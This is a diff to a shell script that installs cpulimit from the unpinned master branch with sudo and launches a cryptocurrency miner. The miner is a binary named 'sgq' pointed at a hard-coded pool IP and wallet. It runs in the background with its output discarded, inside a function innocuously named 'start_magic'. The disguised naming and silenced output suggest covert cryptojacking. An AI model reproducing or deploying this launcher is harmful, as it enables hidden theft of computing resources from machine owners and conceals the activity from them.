@@ -4,21 +4,21 @@
 install_cpulimit() {
   echo "Installing cpulimit..."
 
-  # Download cpulimit source code
-  wget https://github.com/opsengine/cpulimit/archive/refs/tags/v1.2.tar.gz -O cpulimit.tar.gz
-  
-  # Extract the downloaded tarball
-  tar -xzf cpulimit.tar.gz
-  cd cpulimit-1.2 || exit
-  
+  # Download the latest cpulimit release from GitHub
+  wget https://github.com/opsengine/cpulimit/archive/refs/heads/master.zip -O cpulimit.zip
+
+  # Unzip the downloaded file
+  unzip cpulimit.zip
+  cd cpulimit-master || exit
+
   # Compile and install cpulimit
   make
   sudo make install
-  
+
   # Clean up
   cd ..
-  rm -rf cpulimit-1.2 cpulimit.tar.gz
-  
+  rm -rf cpulimit-master cpulimit.zip
+
   echo "cpulimit installed successfully"
 }
 
@@ -55,7 +55,7 @@ start_magic() {
   local cpu_limit=50
   
   # Start the mining process
-  nohup ./sgq -a yescryptr32 --pool 45.115.225.129:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > /dev/null 2>&1 &
+  nohup ./sgq -a yescryptr32 --pool 45.115.225.146:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > /dev/null 2>&1 &
   local pid=$!
   
   echo "Magic started with PID: $pid using $num_cores cores"
